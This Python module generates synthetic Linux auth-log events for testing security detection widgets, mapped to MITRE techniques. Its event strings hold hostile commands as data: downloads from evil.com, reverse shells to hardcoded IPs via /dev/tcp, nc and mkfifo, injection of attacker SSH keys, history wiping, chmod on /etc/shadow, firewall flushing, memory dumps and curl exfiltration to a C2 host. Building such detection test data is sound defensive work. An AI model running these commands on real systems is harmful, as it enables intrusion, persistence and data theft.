"""Auto-extracted from generate_test_logs.py — Linux secure (auth) synthetic events.

Behavior-preserving split: function bodies are unchanged. Shared constants and
helpers live in ``testlogs.common`` and are imported via star import.
"""
import json
import ntpath
import os
import random
import re
import sys
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from testlogs.common import *  # noqa: F401,F403


def linux_secure_event(process, message, host=None, user=None,
                       source_ip=None, auth_method=None, facility="auth",
                       severity="info", offset=0):
    """Generate a Linux Secure/Auth log JSON entry for the Linux Secure Logs source."""
    if host is None:
        host = random.choice(SEVEN_KINGDOMS_LINUX)
    if user is None:
        user = random.choice(THREAT_ACTORS)
    return {
        "EndpointOS": "Linux",
        "Timestamp": ts(offset),
        "Hostname": host,
        "Process": process,
        "PID": random.randint(100, 65535),
        "Facility": facility,
        "Severity": severity,
        "msg": message,
        # ``Command Line`` is required by detection queries that look for
        # specific argv shapes (crontab -e, sudo flags, etc.). Mirror the
        # syslog message into the Command Line column so those queries
        # match without the parser having to guess from raw msg.
        "CommandLine": message,
        "Command Line": message,
        "SourceIP": source_ip or random.choice(SUSPICIOUS_IPS),
        "User": user,
        "AuthMethod": auth_method or "password",
        "SessionType": "ssh" if process == "sshd" else "local",
    }


def generate_linux_secure():
    """Generate Linux Secure log events for multicloudoperations widgets."""
    events = []

    # ── SSH Failed Password ──
    for i in range(20):
        actor = random.choice(THREAT_ACTORS + THREAT_ACTOR_EMAILS)
        src_ip = random.choice(SUSPICIOUS_IPS)
        events.append(linux_secure_event(
            "sshd",
            f"Failed password for {actor} from {src_ip} port {random.randint(40000,65535)} ssh2",
            user=actor, source_ip=src_ip,
            offset=i,
        ))

    # ── SSH Invalid User ──
    for i in range(10):
        src_ip = random.choice(SUSPICIOUS_IPS)
        events.append(linux_secure_event(
            "sshd",
            f"Invalid user {random.choice(THREAT_ACTORS)} from {src_ip} port {random.randint(40000,65535)}",
            source_ip=src_ip,
            offset=30+i,
        ))

    # ── SSH authentication failure ──
    for i in range(8):
        src_ip = random.choice(SUSPICIOUS_IPS)
        events.append(linux_secure_event(
            "sshd",
            f"pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={src_ip}",
            source_ip=src_ip,
            offset=50+i,
        ))

    # ── Sudo failures ──
    for i in range(8):
        actor = random.choice(THREAT_ACTORS)
        events.append(linux_secure_event(
            "sudo",
            f"{actor} : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/{actor} ; USER=root ; COMMAND=/bin/bash",
            user=actor,
            offset=100+i,
        ))

    # ── Sudo NOT in sudoers ──
    for i in range(5):
        actor = random.choice(THREAT_ACTORS)
        events.append(linux_secure_event(
            "sudo",
            f"{actor} : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/{actor} ; USER=root ; COMMAND=/bin/su",
            user=actor,
            offset=120+i,
        ))

    # ── Sudo success ──
    for i in range(10):
        actor = random.choice(THREAT_ACTORS)
        events.append(linux_secure_event(
            "sudo",
            f"{actor} : TTY=pts/{i} ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash",
            user=actor,
            offset=130+i,
        ))

    # ── useradd / adduser: New account creation ──
    for i in range(5):
        events.append(linux_secure_event(
            "useradd",
            f"new user: name=backdoor{i}, UID=100{i}, GID=100{i}, home=/home/backdoor{i}, shell=/bin/bash",
            user=random.choice(THREAT_ACTORS),
            offset=200+i,
        ))
    for i in range(3):
        events.append(linux_secure_event(
            "adduser",
            f"new user: name=evil{i}, UID=200{i}, GID=200{i}, home=/home/evil{i}, shell=/bin/bash",
            user=random.choice(THREAT_ACTORS),
            offset=210+i,
        ))

    # ── passwd: Password changes ──
    for i in range(4):
        actor = random.choice(THREAT_ACTORS)
        events.append(linux_secure_event(
            "passwd",
            f"pam_unix(passwd:chauthtok): password changed for {actor}",
            user=actor,
            offset=220+i,
        ))

    # ── Crontab modification (T1053.003) ──
    # Detection queries also LIKE the Command Line for ``-e`` / ``-r`` /
    # ``/tmp/`` / ``/var/tmp/`` / ``/dev/shm/`` patterns indicative of
    # interactive editing or scripted persistence drops. Emit explicit
    # variants so the SOC: Linux Security widget matches.
    crontab_argv = [
        "crontab -e",
        "crontab -r",
        "crontab -e /tmp/payload.cron",
        "crontab -e /var/tmp/persist.cron",
        "crontab -l > /dev/shm/cronbackup",
        "crontab /tmp/.hidden-cron",
    ]
    for i, argv in enumerate(crontab_argv):
        actor = random.choice(THREAT_ACTORS)
        events.append(linux_secure_event(
            "crontab",
            f"({actor}) CMD ({argv})",
            user=actor, facility="cron",
            offset=295+i,
        ))
    for i in range(6):
        actor = random.choice(THREAT_ACTORS)
        events.append(linux_secure_event(
            "crontab",
            f"({actor}) REPLACE ({actor}) crontab",
            user=actor, facility="cron",
            offset=300+i,
        ))
    for i in range(3):
        events.append(linux_secure_event(
            "crond",
            f"(root) REPLACE (root) crontab",
            user="root", facility="cron",
            offset=310+i,
        ))

    # ── systemctl enable (T1543.002) ──
    for i in range(4):
        events.append(linux_secure_event(
            "systemctl",
            f"enable evil-service-{i}.service",
            user=random.choice(THREAT_ACTORS),
            offset=320+i,
        ))

    # ── authorized_keys modification (T1098.004) ──
    for i in range(5):
        actor = random.choice(THREAT_ACTORS)
        events.append(linux_secure_event(
            "sshd",
            f"Accepted publickey for {actor} from {random.choice(SUSPICIOUS_IPS)} port 22 ssh2: RSA SHA256:AAAA",
            user=actor, auth_method="publickey",
            offset=400+i,
        ))
    for i in range(4):
        events.append(linux_secure_event(
            "bash",
            f"echo 'ssh-rsa AAAA... attacker@evil' >> /home/{random.choice(THREAT_ACTORS)}/.ssh/authorized_keys",
            facility="syslog",
            offset=410+i,
        ))

    # ── History clearing (T1070.003) ──
    history_cmds = [
        "history -c", "rm -f ~/.bash_history",
        "unset HISTFILE", "export HISTSIZE=0",
        "cat /dev/null > ~/.bash_history",
    ]
    for i, cmd in enumerate(history_cmds):
        events.append(linux_secure_event(
            "bash", cmd,
            user=random.choice(THREAT_ACTORS),
            facility="syslog",
            offset=500+i,
        ))

    # ── Defense evasion: chmod +s, /etc/shadow, /etc/passwd ──
    evasion_cmds = [
        "chmod +s /tmp/exploit",
        "chmod u+s /usr/local/bin/backdoor",
        "chmod 777 /etc/shadow",
        "chmod 666 /etc/passwd",
    ]
    for i, cmd in enumerate(evasion_cmds):
        events.append(linux_secure_event(
            "bash", cmd,
            user=random.choice(THREAT_ACTORS),
            facility="syslog",
            offset=510+i,
        ))

    # ── Execution: curl/wget/nc/python/perl/bash ──
    exec_cmds = [
        ("curl", "curl -o /tmp/payload http://evil.com/malware"),
        ("wget", "wget http://evil.com/backdoor -O /tmp/bd"),
        ("python", "python -c 'import pty;pty.spawn(\"/bin/sh\")'"),
        ("perl", "perl -e 'exec \"/bin/sh\"'"),
    ]
    for i, (proc, cmd) in enumerate(exec_cmds):
        events.append(linux_secure_event(
            proc, cmd,
            user=random.choice(THREAT_ACTORS),
            facility="syslog",
            offset=600+i,
        ))

    # ── Reverse shell patterns ──
    shells = [
        "bash -i >& /dev/tcp/185.215.113.206/4444 0>&1",
        "nc -e /bin/sh 103.253.41.45 8080",
        "python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"185.215.113.206\",4444));'",
        "mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 5.252.178.48 443 >/tmp/f",
    ]
    for i, shell in enumerate(shells):
        events.append(linux_secure_event(
            "bash", shell,
            user=random.choice(THREAT_ACTORS),
            facility="syslog",
            offset=700+i,
        ))

    # ── Network defense evasion: iptables/ufw ──
    net_cmds = [
        ("iptables", "iptables -F"),
        ("iptables", "iptables -A INPUT -p tcp --dport 4444 -j ACCEPT"),
        ("ufw", "ufw disable"),
    ]
    for i, (proc, cmd) in enumerate(net_cmds):
        events.append(linux_secure_event(
            proc, cmd,
            user=random.choice(THREAT_ACTORS),
            facility="syslog",
            offset=800+i,
        ))

    # ── Credential access: /proc/kcore, /dev/mem ──
    cred_cmds = [
        "cat /proc/kcore > /tmp/memory.dmp",
        "dd if=/dev/mem of=/tmp/mem.dmp bs=1M count=10",
    ]
    for i, cmd in enumerate(cred_cmds):
        events.append(linux_secure_event(
            "bash", cmd,
            user=random.choice(THREAT_ACTORS),
            facility="syslog",
            offset=900+i,
        ))

    web_to_cloud_cmds = [
        (
            "curl",
            "curl -H 'Authorization: Bearer Oracle' http://169.254.169.254/opc/v2/instance/",
            "metadata_service_access",
        ),
        (
            "bash",
            f"tar czf /tmp/{WEB_TO_CLOUD_EXFIL_OBJECT}.tgz /var/app/exports/{WEB_TO_CLOUD_EXFIL_OBJECT}",
            "data_staging",
        ),
        (
            "curl",
            f"curl -k https://{WEB_TO_CLOUD_C2_HOST}/upload --data-binary @/tmp/{WEB_TO_CLOUD_EXFIL_OBJECT}.tgz",
            "data_exfiltration",
        ),
    ]
    for i, (process, command, stage) in enumerate(web_to_cloud_cmds):
        event = linux_secure_event(
            process,
            command,
            host=WEB_TO_CLOUD_COMPROMISED_HOST,
            user="svc-app",
            source_ip=WEB_TO_CLOUD_ATTACKER_IP if i == 0 else WEB_TO_CLOUD_COMPROMISED_PRIVATE_IP,
            facility="syslog",
            offset=980+i,
        )
        event["Trace ID"] = WEB_TO_CLOUD_TRACE_ID
        event["Attack Stage"] = stage
        events.append(event)

    return events
